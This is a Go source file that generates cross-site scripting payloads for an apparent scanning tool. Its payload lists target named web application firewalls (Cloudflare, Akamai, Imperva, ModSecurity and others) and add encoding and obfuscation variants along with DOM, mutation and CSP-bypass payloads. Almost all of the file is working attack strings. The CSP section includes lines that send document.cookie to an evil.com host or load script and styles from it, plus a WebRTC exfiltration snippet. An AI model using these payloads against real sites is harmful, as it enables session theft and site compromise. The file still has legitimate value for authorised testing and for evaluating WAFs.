package payloads

import (
	"bufio"
	"fmt"
	"os"
	"strings"
)

// Generator handles XSS payload generation with WAF-specific bypasses
type Generator struct {
	smartMode bool
}

// NewGenerator creates a new payload generator
func NewGenerator(smartMode bool) *Generator {
	return &Generator{smartMode: smartMode}
}

// LoadFromFile loads payloads from a custom file
func (g *Generator) LoadFromFile(filepath string) ([]string, error) {
	file, err := os.Open(filepath)
	if err != nil {
		return nil, fmt.Errorf("failed to open payload file: %w", err)
	}
	defer file.Close()

	var payloads []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			payloads = append(payloads, line)
		}
	}
	return payloads, scanner.Err()
}

// GetPayloads returns payloads optimized for the detected WAF
func (g *Generator) GetPayloads(wafType string) []string {
	// Pre-allocate slice with estimated capacity to reduce reallocations
	payloads := make([]string, 0, 500)

	// Start with high-confidence base payloads
	payloads = append(payloads, g.getBasePayloads()...)

	// Add AwesomeXSS specific payloads
	payloads = append(payloads, g.getAwesomeConfirmVariants()...)
	payloads = append(payloads, g.getAwesomeContextBreaking()...)

	// Add DOM-based XSS payloads
	payloads = append(payloads, g.getDOMXSSPayloads()...)

	// Add Mutation XSS payloads (mXSS)
	payloads = append(payloads, g.getMutationXSSPayloads()...)

	// Add WAF-specific bypass payloads
	payloads = append(payloads, g.getWAFSpecificPayloads(wafType)...)

	// Add dynamic encodings and obfuscation for advanced WAF bypass
	// This takes base payloads and applies random encoding/obfuscation
	// Especially useful if a WAF is detected
	if wafType != "" || g.smartMode {
		encoder := NewEncoder()
		obfuscator := NewObfuscator()

		var dynamicPayloads []string

		// Use a subset of reliable payloads as base to avoid explosion
		base := g.getBasePayloads()
		if len(base) > 20 {
			base = base[:20] // Take top 20 reliable ones
		}

		for _, p := range base {
			// 1. Obfuscation
			dynamicPayloads = append(dynamicPayloads, obfuscator.GenerateVariants(p)...)

			// 2. Encoding (applied to original and obfuscated)
			// We only encode a few key ones to check protocol blocking
			dynamicPayloads = append(dynamicPayloads, encoder.URLEncode(p))
			dynamicPayloads = append(dynamicPayloads, encoder.DoubleURLEncode(p))

			// For some, we try unicode (only if <script found)
			if strings.Contains(p, "<script") {
				dynamicPayloads = append(dynamicPayloads, encoder.UnicodeEncode(p))
			}
		}
		payloads = append(payloads, dynamicPayloads...)
	}

	// Add smart/polyglot payloads if enabled
	if g.smartMode {
		payloads = append(payloads, g.getSmartPayloads()...)
		payloads = append(payloads, g.getPolyglotPayloads()...)
		payloads = append(payloads, g.getAwesomePolyglots()...)
		payloads = append(payloads, g.getCSPBypassPayloads()...)
	}

	return g.deduplicate(payloads)
}

// getWAFSpecificPayloads returns bypass payloads for the specific WAF
func (g *Generator) getWAFSpecificPayloads(wafType string) []string {
	switch strings.ToLower(wafType) {
	case "cloudflare":
		return g.getCloudflareBypass()
	case "akamai":
		return g.getAkamaiBypass()
	case "cloudfront", "aws-waf":
		return g.getCloudfrontBypass()
	case "imperva", "incapsula":
		return g.getImpervaBypass()
	case "wordfence":
		return g.getWordfenceBypass()
	case "modsecurity":
		return g.getModSecurityBypass()
	case "sucuri":
		return g.getSucuriBypass()
	case "f5":
		return g.getF5Bypass()
	default:
		// Unknown or no WAF - use comprehensive bypass set
		return g.getAllBypass()
	}
}

// getAwesomeConfirmVariants returns confirm() based payloads from AwesomeXSS
// confirm() is often less detected than alert()
func (g *Generator) getAwesomeConfirmVariants() []string {
	return []string{
		"confirm()",
		"confirm``",
		"(confirm``)",
		"{confirm``}",
		"[confirm``]",
		"(((confirm)))``",
		"co\\u006efirm()",
		"new class extends confirm``{}",
		"[8].find(confirm)",
		"[8].map(confirm)",
		"[8].some(confirm)",
		"[8].every(confirm)",
		"[8].filter(confirm)",
		"[8].findIndex(confirm)",
		"<script>confirm()</script>",
		"<img src=x onerror=confirm()>",
		"<svg/onload=confirm()>",
	}
}

// getAwesomeContextBreaking returns context breaking payloads from AwesomeXSS
func (g *Generator) getAwesomeContextBreaking() []string {
	return []string{
		// HTML Context
		"<svg onload=alert(1)>",
		"</tag><svg onload=alert(1)>",

		// Attribute Context
		"\"><svg onload=alert(1)>",
		"\"><svg onload=alert(1)><b attr=\"",
		"\" onmouseover=alert(1) \"",
		"\"onmouseover=alert(1)//",
		"\"autofocus/onfocus=\"alert(1)",

		// JavaScript Context
		"'-alert(1)-'",
		"'-alert(1)//'",
		"'}alert(1);{'",
		"'}%0Aalert(1);%0A{'",
		"</script><svg onload=alert(1)>",
	}
}

// getAwesomePolyglots returns advanced polyglots from AwesomeXSS
func (g *Generator) getAwesomePolyglots() []string {
	return []string{
		// S0md3v's Polyglot
		`%0ajavascript:` + "`/*\\\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover=\"/**/ alert()//'\">`",

		// Common Polyglots
		`javascript://%250Aalert(1)//"/*\'/*"/*\'/*</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*`,
		`javascript://%250Aalert(1)//"/*\'/*"/*\'/*</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*`,
	}
}

// getBasePayloads returns reliable XSS payloads that work in most scenarios
func (g *Generator) getBasePayloads() []string {
	return []string{
		// Classic script tag payloads
		`<script>alert(1)</script>`,
		`<script>confirm(1)</script>`,
		`<script>prompt(1)</script>`,

		// IMG tag payloads
		`<img src=x onerror=alert(1)>`,
		`<img src=x onerror=confirm(1)>`,
		`<img src=x onerror="alert(1)">`,

		// SVG payloads
		`<svg onload=alert(1)>`,
		`<svg/onload=alert(1)>`,
		`<svg onload=confirm(1)>`,

		// Body tag payloads
		`<body onload=alert(1)>`,
		`<body/onload=alert(1)>`,

		// Input payloads
		`<input onfocus=alert(1) autofocus>`,
		`<input/onfocus=alert(1) autofocus>`,

		// Iframe payloads
		`<iframe src="javascript:alert(1)">`,
		`<iframe srcdoc="<script>alert(1)</script>">`,

		// Other event handlers
		`<details open ontoggle=alert(1)>`,
		`<marquee onstart=alert(1)>`,
		`<video src=x onerror=alert(1)>`,
		`<audio src=x onerror=alert(1)>`,
		`<select onfocus=alert(1) autofocus>`,
		`<textarea onfocus=alert(1) autofocus>`,

		// JavaScript URI payloads
		`javascript:alert(1)`,
		`javascript:confirm(1)`,

		// Attribute breakout payloads
		`"><script>alert(1)</script>`,
		`'><script>alert(1)</script>`,
		`" onclick=alert(1) "`,
		`' onclick=alert(1) '`,
		`" onfocus=alert(1) autofocus "`,
		`' onfocus=alert(1) autofocus '`,
		`"><img src=x onerror=alert(1)>`,
		`'><img src=x onerror=alert(1)>`,
	}
}

// getCloudflareBypass returns Cloudflare-specific bypass payloads
func (g *Generator) getCloudflareBypass() []string {
	return []string{
		// HTML entity encoding
		`<svg/onload=&#97&#108&#101&#114&#116(1)>`,
		`<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>`,

		// Unicode escapes
		`<img src=x onerror=\u0061lert(1)>`,
		`<svg onload=\u0061\u006c\u0065\u0072\u0074(1)>`,

		// Base64 + eval
		`<svg onload=eval(atob('YWxlcnQoMSk='))>`,
		`<img src=x onerror=eval(atob('YWxlcnQoMSk='))>`,

		// Alternative alert methods
		`<svg><animate onbegin=alert(1) attributeName=x>`,
		`<svg><set onbegin=alert(1) attributeName=x>`,

		// Constructor method
		`<script>onerror=alert;throw 1</script>`,
		`<script>[].constructor.constructor('alert(1)')();</script>`,

		// Template literals (using regular string for backticks)
		"<svg onload=alert`1`>",

		// Tag obfuscation
		`<ScRiPt>alert(1)</sCrIpT>`,
		`<SCRIPT>alert(1)</SCRIPT>`,
	}
}

// getAkamaiBypass returns Akamai-specific bypass payloads
func (g *Generator) getAkamaiBypass() []string {
	return []string{
		// Slash obfuscation
		`<svg/onload=prompt(1)>`,
		`<body/onload=alert(1)>`,
		`<input/onfocus=alert(1) autofocus>`,
		`<marquee/onstart=alert(1)>`,

		// Alternative event handlers
		`<form><button formaction=javascript:alert(1)>X</button>`,
		`<math><maction actiontype=statusline#http://google.com xlink:href=javascript:alert(1)>click`,
		`<isindex action=javascript:alert(1) type=submit value=click>`,

		// Various tag bypasses
		`<xss onmouseover=alert(1)>hover</xss>`,
		`<x onclick=alert(1)>click</x>`,

		// Data URI
		`<object data="data:text/html,<script>alert(1)</script>">`,
		`<embed src="data:text/html,<script>alert(1)</script>">`,
	}
}

// getCloudfrontBypass returns CloudFront-specific bypass payloads
func (g *Generator) getCloudfrontBypass() []string {
	return []string{
		// String.fromCharCode
		`<img src=x onerror=alert(String.fromCharCode(88,83,83))>`,
		`<svg onload=alert(String.fromCharCode(49))>`,

		// Regex tricks
		`<svg onload=top[/al/.source+/ert/.source](1)>`,
		`<svg onload=window[/al/.source+/ert/.source](1)>`,

		// Template literals
		`<script>top["al"+"ert"](1)</script>`,
		`<script>window["al"+"ert"](1)</script>`,

		// Indirect eval
		`<script>(1,eval)('alert(1)')</script>`,
		`<script>eval.call(null,'alert(1)')</script>`,
	}
}

// getImpervaBypass returns Imperva-specific bypass payloads
func (g *Generator) getImpervaBypass() []string {
	return []string{
		// Comment injection
		`<svg onload=alert(1)//>`,
		`<script>/**/alert(1)/**/</script>`,
		`<img src=x onerror="/**/alert(1)">`,

		// Function constructor
		`<script>Function("ale"+"rt(1)")();</script>`,
		`<script>new Function('alert(1)')();</script>`,

		// Form action
		`<form action=javascript:alert(1)><input type=submit>`,
		`<form id=f action=javascript:alert(1)></form><input form=f type=submit>`,

		// Alternative handlers
		`<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>`,
		`<math><mtext><table><mglyph><style><![CDATA[</style><img src=x onerror=alert(1)>]]></mglyph></table></mtext></math>`,
	}
}

// getWordfenceBypass returns Wordfence-specific bypass payloads
func (g *Generator) getWordfenceBypass() []string {
	return []string{
		// Null byte injection
		`<script\x00>alert(1)</script>`,
		`<img src\x00=x onerror=alert(1)>`,

		// WordPress-specific contexts
		`[caption]<script>alert(1)</script>[/caption]`,
		`[gallery]<img src=x onerror=alert(1)>[/gallery]`,

		// Tab/newline obfuscation
		`<script>al	ert(1)</script>`,
		`<img src=x on
error=alert(1)>`,

		// Event handler variations
		`<svg/onload=confirm(1)>`,
		`<svg/onload=prompt(1)>`,
	}
}

// getModSecurityBypass returns ModSecurity-specific bypass payloads
func (g *Generator) getModSecurityBypass() []string {
	return []string{
		// Hex encoding
		`<script>alert(0x1)</script>`,
		`<img src=x onerror=alert(\x31)>`,

		// Unicode normalization
		`<script>ａｌｅｒｔ(1)</script>`,

		// Double URL encoding (for specific situations)
		`%253Cscript%253Ealert(1)%253C/script%253E`,

		// Base64 with atob
		`<svg onload=eval(atob('YWxlcnQoMSk='))>`,
		`<img src=x onerror=eval(atob('YWxlcnQoMSk='))>`,

		// Concatenation
		`<script>a]lert(1)</script>`,
		`<script>eval('a]l'+'ert(1)')</script>`,
	}
}

// getSucuriBypass returns Sucuri-specific bypass payloads
func (g *Generator) getSucuriBypass() []string {
	return []string{
		// Tag obfuscation
		`<ScRiPt>alert(1)</ScRiPt>`,
		`<sCRIpt>alert(1)</sCRIpt>`,

		// Event handler variations
		`<svg onLoad=alert(1)>`,
		`<img src=x onError=alert(1)>`,

		// Tab insertion
		`<img	src=x	onerror=alert(1)>`,
		`<svg	onload=alert(1)>`,
	}
}

// getF5Bypass returns F5 BIG-IP ASM-specific bypass payloads
func (g *Generator) getF5Bypass() []string {
	return []string{
		// Protocol-level bypasses
		`<svg onload=alert(1)>`,
		`<img src=x onerror=alert(1)>`,

		// Chunked encoding context
		`<script>al\u0065rt(1)</script>`,

		// Cookie-based context
		`<meta http-equiv="Set-Cookie" content="x=<script>alert(1)</script>">`,
	}
}

// getAllBypass returns all bypass payloads for unknown WAFs
func (g *Generator) getAllBypass() []string {
	var all []string
	all = append(all, g.getCloudflareBypass()...)
	all = append(all, g.getAkamaiBypass()...)
	all = append(all, g.getCloudfrontBypass()...)
	all = append(all, g.getImpervaBypass()...)
	all = append(all, g.getModSecurityBypass()...)
	return all
}

// getSmartPayloads returns context-aware smart payloads
func (g *Generator) getSmartPayloads() []string {
	return []string{
		// Case variations
		`<SCRIPT>alert(1)</SCRIPT>`,
		`<ScRiPt>alert(1)</sCrIpT>`,
		`<sCRIpt>alert(1)</scrIPT>`,

		// Whitespace variations
		`<script >alert(1)</script >`,
		`<script	>alert(1)</script	>`,
		`< script>alert(1)</script>`,

		// Comment insertion
		`<script>eval/*comment*/('alert(1)')</script>`,
		`<img src=x onerror=/**/alert(1)>`,

		// Newline insertion
		`<script
>alert(1)</script
>`,

		// URL encoded payloads
		`%3Cscript%3Ealert(1)%3C/script%3E`,
		`%3Csvg%20onload%3Dalert(1)%3E`,
	}
}

// getPolyglotPayloads returns polyglot XSS payloads that work in multiple contexts
func (g *Generator) getPolyglotPayloads() []string {
	return []string{
		// Classic polyglots
		`'"></title></style></script><script>alert(1)</script>`,
		`'"--><script>alert(1)</script>`,
		`</script><script>alert(1)</script>`,

		// Context-breaking polyglots
		`"><img src=x onerror=alert(1)><"`,
		`'"><img src=x onerror=alert(1)><'`,
		`--><script>alert(1)</script><!--`,

		// SVG polyglots
		`</title><svg onload=alert(1)>`,
		`</style><svg onload=alert(1)>`,
		`</script><svg onload=alert(1)>`,

		// Multi-context polyglot (using regular string for backticks)
		"jaVasCript:/*-/*'/*\"/*'/*\"/*`/*--><svg onload=/*<html/*/onmouseover=alert(1)//>",

		// HTML5 specific
		`<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">CLICK`,
	}
}

// getDOMXSSPayloads returns payloads specifically for DOM-based XSS
func (g *Generator) getDOMXSSPayloads() []string {
	return []string{
		// Location-based DOM XSS
		`javascript:alert(document.domain)`,
		`javascript:alert(document.cookie)`,
		`#<script>alert(1)</script>`,
		`#<img src=x onerror=alert(1)>`,

		// document.write payloads
		`<img src=x onerror="document.write('<script>alert(1)</script>')">`,

		// innerHTML payloads
		`<div id=x></div><script>x.innerHTML='<img src=x onerror=alert(1)>'</script>`,

		// jQuery-specific DOM XSS
		`<img src=x onerror="$('body').append('<script>alert(1)</script>')">`,
		`#<img src=x onerror=$.globalEval('alert(1)')>`,

		// Prototype pollution based
		`__proto__[innerHTML]=<img src=x onerror=alert(1)>`,
		`constructor[prototype][innerHTML]=<img src=x onerror=alert(1)>`,

		// postMessage based
		`<script>window.postMessage('<img src=x onerror=alert(1)>','*')</script>`,

		// Web Storage based
		`<script>localStorage.setItem('xss','<img src=x onerror=alert(1)>');document.write(localStorage.getItem('xss'))</script>`,

		// URL fragment payloads
		`#"><script>alert(1)</script>`,
		`#'><script>alert(1)</script>`,

		// Angular-specific
		`{{constructor.constructor('alert(1)')()}}`,
		`{{$on.constructor('alert(1)')()}}`,

		// Vue.js specific
		`{{_c.constructor('alert(1)')()}}`,

		// React-specific (dangerouslySetInnerHTML exploitation)
		`<div dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert(1)>'}}></div>`,
	}
}

// getMutationXSSPayloads returns mutation-based XSS payloads (mXSS)
func (g *Generator) getMutationXSSPayloads() []string {
	return []string{
		// Classic mXSS payloads that survive DOM sanitization
		`<noscript><p title="</noscript><script>alert(1)</script>">`,
		`<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>--></mglyph></table></mtext></math>`,
		`<svg><style><img src=x onerror=alert(1)></style></svg>`,

		// Backtick-based mXSS
		"<img src=`x`onerror=alert(1)>",
		"<svg><script>alert&#40;1)</script></svg>",

		// Entity-based mXSS
		`<svg><script>&#97;&#108;&#101;&#114;&#116;(1)</script></svg>`,

		// Namespace confusion
		`<svg><foreignObject><body onload=alert(1)></foreignObject></svg>`,
		`<math><mtext><table><mglyph><style><![CDATA[</style><img src=x onerror=alert(1)>]]></mglyph></table></mtext></math>`,

		// DOMPurify bypasses (historical)
		`<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>`,
		`<svg></p><style><g/onload=alert(1)>`,

		// innerHTML mutation
		`<img src="x` + "`" + `><script>alert(1)</script>">`,

		// Comment-based mXSS
		`<!--<img src="--><img src=x onerror=alert(1)//">`,
		`<![CDATA[><script>alert(1)</script>]]>`,

		// Attribute mutation
		`<div id="x"><script>alert(1)//` + "`" + `"></div>`,
	}
}

// getCSPBypassPayloads returns payloads that may bypass Content Security Policy
func (g *Generator) getCSPBypassPayloads() []string {
	return []string{
		// JSONP-based bypasses (if allowed domains have JSONP)
		`<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert"></script>`,

		// Base tag injection for relative path hijacking
		`<base href="https://evil.com/">`,

		// Script gadgets in common libraries
		`<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>`,

		// data: URI exploits (if data: allowed)
		`<script src="data:text/javascript,alert(1)"></script>`,

		// Blob URL (if blob: allowed)
		`<script>var b=new Blob(['alert(1)'],{type:'text/javascript'});var s=document.createElement('script');s.src=URL.createObjectURL(b);document.body.appendChild(s)</script>`,

		// Worker-based execution
		`<script>new Worker("data:text/javascript,postMessage(eval('alert(1)'))")</script>`,

		// Object/Embed bypasses
		`<object data="data:text/html,<script>alert(1)</script>">`,
		`<embed src="data:text/html,<script>alert(1)</script>">`,

		// SVG with inline script
		`<svg><script xlink:href="data:,alert(1)"></script></svg>`,

		// prefetch/preload exploitation
		`<link rel="prefetch" href="https://evil.com/steal?cookie='+document.cookie">`,

		// Meta refresh (for CSP-only headers without X-Frame-Options)
		`<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`,

		// Style-based data exfiltration (CSS injection)
		`<style>@import 'https://evil.com/steal.css';</style>`,

		// Using allowed hosts for redirection
		`<script src="/redirect?url=https://evil.com/evil.js"></script>`,

		// WebRTC-based exfiltration
		`<script>var pc=new RTCPeerConnection({iceServers:[{urls:"stun:evil.com"}]});pc.createDataChannel("");pc.createOffer().then(o=>pc.setLocalDescription(o))</script>`,
	}
}

// deduplicate removes duplicate payloads while preserving order
func (g *Generator) deduplicate(payloads []string) []string {
	if len(payloads) == 0 {
		return payloads
	}
	seen := make(map[string]struct{}, len(payloads))
	// Pre-allocate to avoid resizing
	unique := make([]string, 0, len(payloads))

	for _, p := range payloads {
		if _, exists := seen[p]; !exists {
			seen[p] = struct{}{}
			unique = append(unique, p)
		}
	}
	return unique
}
